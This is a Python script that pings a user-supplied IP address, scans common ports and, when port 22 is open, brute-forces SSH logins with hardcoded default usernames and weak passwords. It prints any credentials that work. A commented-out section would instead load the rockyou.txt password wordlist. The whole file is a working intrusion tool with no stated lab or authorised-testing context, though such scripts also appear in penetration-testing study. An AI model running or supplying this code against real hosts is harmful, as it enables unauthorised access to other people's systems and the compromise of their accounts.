from scapy.all import sr1, IP, ICMP
import socket
import paramiko

def check_target(ip_address):
    print(f'Check if {ip_address} is available')
    packet = IP(dst=ip_address)/ICMP()
    response = sr1(packet, timeout=2, verbose=0)
    return response is not None

def scan_ports(ip_address):
    print(f'Scanning ports on {ip_address}')
    open_ports = []
    ports_to_scan = [22, 80, 443, 21, 25, 110, 143, 53, 3389]
    for port in ports_to_scan:  # Scan ports
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((ip_address, port)) == 0:  # If port is open
                open_ports.append(port)
    return open_ports

def ssh_login(ip_address, username, password):
    client = paramiko.SSHClient()  # Create an SSH-client
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # We accept keys automatically
    try:
        client.connect(ip_address, port=22, username=username, password=password)
        print(f'Connected. Username:{username}. Password:{password}')
        return client   # Return the ssh client for further use
    except Exception:
        return None

def user_input():
    target_ip = input(f'Enter IP-address: ')

    if check_target(target_ip):  # check if the IP is available
        print(f'{target_ip} is available')
        open_ports = scan_ports(target_ip)  # scan for open ports
        print(f'Open ports: {open_ports}')

#        if 22 in open_ports:  # check if port SSH is open
#            usernames = []
#            passwords = []
#            with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
#                usernames = f.read().splitlines()
#            with open('/usr/share/wordlists/rockyou.txt', 'r', encoding='latin-1') as f:
#                passwords = f.read().splitlines()

        if 22 in open_ports:
            usernames = ["admin","Administrator", "user", "test"]
            passwords = ["123456", "password", "admin","P@$$W0rd", "test123"]

            for username in usernames:
                for password in passwords:
                    if ssh_login(target_ip, username, password):  # If login is successful
                        print(f'Use the command to connect: ssh {username}@{target_ip}')
                        return  # Exit after the first successful attempt
            print("Username and password incorrect")
        else:
            print("Port 22 is closed")
    else:
        print(f'{target_ip} is unavailable')

if __name__ == "__main__":
    user_input()

